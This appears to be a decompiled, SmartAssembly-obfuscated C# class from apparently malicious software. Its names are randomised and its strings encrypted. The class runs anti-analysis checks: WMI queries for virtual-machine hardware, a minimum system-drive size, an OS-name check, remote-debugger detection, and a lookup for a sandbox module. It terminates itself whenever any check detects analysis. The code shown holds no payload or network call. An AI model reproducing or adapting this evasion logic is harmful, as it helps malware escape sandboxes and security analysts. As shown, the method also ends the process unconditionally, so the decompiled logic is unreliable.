using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UvfJgsTEpPeNG;

internal sealed class vXxyalqNXdsqm
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void rHsBnuPPXo()
	{
		if (thUbUOFwGdMncr() || mHMRkMFOLnCSOS() || ESsVEVcXgWANOC() || gcEjeGscJL() || mFEWyknHbcYGlI())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	private static bool gcEjeGscJL()
	{
		try
		{
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool mFEWyknHbcYGlI()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains(getString_0(107373800)))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool thUbUOFwGdMncr()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107373795));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item(getString_0(107373714)).ToString()!.ToLower();
							if ((text == getString_0(107374209) && current.get_Item(getString_0(107374212)).ToString()!.ToUpperInvariant().Contains(getString_0(107374171))) || text.Contains(getString_0(107374190)) || current.get_Item(getString_0(107374212)).ToString() == getString_0(107374181))
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool mHMRkMFOLnCSOS()
	{
		bool bool_ = false;
		try
		{
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref bool_);
			return bool_;
		}
		catch
		{
			return bool_;
		}
	}

	private static bool ESsVEVcXgWANOC()
	{
		try
		{
			if (GetModuleHandle(getString_0(107374132)).ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_0);

	static vXxyalqNXdsqm()
	{
		Strings.CreateGetStringDelegate(typeof(vXxyalqNXdsqm));
	}
}
